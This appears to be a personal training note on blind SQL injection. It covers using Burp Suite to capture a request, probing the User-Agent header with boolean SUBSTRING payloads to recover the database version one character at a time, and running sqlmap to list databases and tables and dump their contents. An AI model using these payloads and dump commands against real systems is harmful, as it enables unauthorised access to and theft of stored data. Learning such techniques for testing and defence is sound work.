---
title: Example 2 - Substring
updated: 2023-09-29 10:45:53Z
created: 2023-09-29 08:24:39Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

## BurpSuite:

![8ba98a3fd85bba97f334a302d9cfa22b.png](../../_resources/8ba98a3fd85bba97f334a302d9cfa22b.png)
URL-Encode the payload:
![aada12aac018e28fa7725cbc87cf60d0.png](../../_resources/aada12aac018e28fa7725cbc87cf60d0.png)
Copy payload to file **payload.txt** and check with **sqlmap**:
![1e981a65bbccc730f9cca21b77c791ab.png](../../_resources/1e981a65bbccc730f9cca21b77c791ab.png)

`sqlmap -r payload.txt`

**Check next payload**:
![e0e65e83a84cc1cd97398a1459d215fe.png](../../_resources/e0e65e83a84cc1cd97398a1459d215fe.png)

![381429ab9164519c93e001a26522e641.png](../../_resources/381429ab9164519c93e001a26522e641.png)

**Think OUTSIDE THE BOX!:**
Maybe it's processing User-Agent?
![fc8f56ee85db67c1c446218033a7d008.png](../../_resources/fc8f56ee85db67c1c446218033a7d008.png)


Now try to find version 1 step at a time
***SUBSTRING(string, start, length)***

`' and substring((Version()), 1, 1) = '7'#`
if no match, try next number
`' and substring((Version()), 1, 1) = '8'#`
if match, move to next integer 
`' and substring((Version()), 2, 1) = '.'#`
`' and substring((Version()), 3, 1) = '0'#`
eg **8.0.1**
`' and substring((Version()), 1, 5) = '8.0.1'#`
![57b72d12e86c66b492e728d6843cd2e6.png](../../_resources/57b72d12e86c66b492e728d6843cd2e6.png)

## sqlmap
Use to check for injection vulnerabilities and dump sql data

1. Find list of databases:
`sqlmap -r payload.txt --level=2 -dbs`  
2. Find tables in selected database
`sqlmap -r payload.txt --level=2 -D <database> -tables` 
3. Scan selected table
`sqlmap -r payload.txt --level=2 -D <database> -T <table> -a`


